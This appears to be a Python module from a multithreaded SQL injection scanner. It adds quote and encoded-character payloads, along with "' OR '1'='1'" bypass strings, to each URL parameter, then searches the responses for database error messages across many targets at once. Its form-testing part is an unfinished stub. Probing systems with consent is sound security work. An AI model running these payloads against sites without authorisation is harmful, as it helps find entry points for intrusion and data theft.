#!/usr/bin/python3
#1.0-beta

import logging
import queue
import time
import threading
import multiprocessing
import subprocess
import src.web.web as web
import src.sqlerrors as sqlerrors
import urllib.parse as parse
import re

__name__ = "python-scanner"

logger  = logging.getLogger(__name__)

def exec_post(url, proxy=None):
    payloads = ("' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #", "' OR '1'=1' %00", "' OR '1'='1' %16")
    for payload in payloads:
        print(payload)
    return url

def find_form(html, proxy=None):
    if html is not "":
        forms = re.findall("<form.*", str(html))
        for form in forms:
            pass
        return forms

def sqli(url, proxy=None):
    """check SQL injection vulnerability"""
    
    logger.debug("Starting SQLI payloads on: %s" % (url) ) 

    domain = parse.urlparse(url)  # domain with path without queries
    #print(domain.hostname)
    queries = domain.query.split("&")
     # no queries in url
    if not any(queries):
        #std.stdebug("No queries in URL %s." % (url), end="\n")
        #std.stdebug("", end="\n") # move cursor to new line
        logger.debug("No queries in URL %s to test SQLi. Will attempt to look for POST forms." %  (url) )
        
        html = web.gethtml(url, proxy=proxy)
        resForm = find_form(html, proxy=proxy)
        if resForm is not None:
            for form in resForm:
                logger.debug("Found %s ", str(form) )
            #return True, url
        else:
            logger.debug("No forms found....")
            #return False, url
    else:
        domain = domain.geturl().split("?")[0]
        logger.debug("Found queries in %s to test SQLi.",  domain)
        payloads = ("'", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
        for payload in payloads:
            website = domain + "?" + ("&".join([param + payload for param in queries]))
            logger.debug("Fetching content of URL %s with PAYLOAD: [%s]\n[%s]" %  (url ,payload, website) )
            source = web.gethtml(website, proxy=proxy)
            if source:
                vulnerable, db = sqlerrors.check(source)
                if vulnerable is True and db != None:
                    logger.info("Target URL is vulnerable")
                    return True, url, db
            else:
                logger.debug("Unable to fetch website source.")

    print("\n")  # move cursor to new line
    return False, url

def scan(urls, proxy=None, threads=20):
    """scan multiple websites with multi processing"""

    logger.debug("Starting scanner.")
    vulnerables = [] 
    tested = []

    q   = queue.Queue()
    
    logger.info("Starting on %s", len(urls) )

    def worker():
        logger.debug("Starting worker.")
        while True:
            time.sleep(0.2)
            url, proxy = q.get() # get queue item
            print(url)
            logger.debug("Starting SQLI payloads on %s -> %s", proxy, url)
            test = sqli(url, proxy)
            if test[0]:
                logger.debug("vulnerable URL found  %s ", test[1] )
                tested.append((test))
            q.task_done()
            logger.debug("Thread finished.")
            #print(test)

    for url in urls:
        #print(url)
        q.put((url, proxy))

    for i in range(threads):
        t = threading.Thread(target=worker)
        logger.debug("Starting thread: %s ", t.name)
        t.daemon = True
        time.sleep(1)
        t.start()
        #t.join()

    logger.debug("Waiting for threads to finish to join.")
    q.join()
    #t.join()
    
    logger.debug("Done waiting for threads, all finished and returning %s results", len(tested))
    return tested

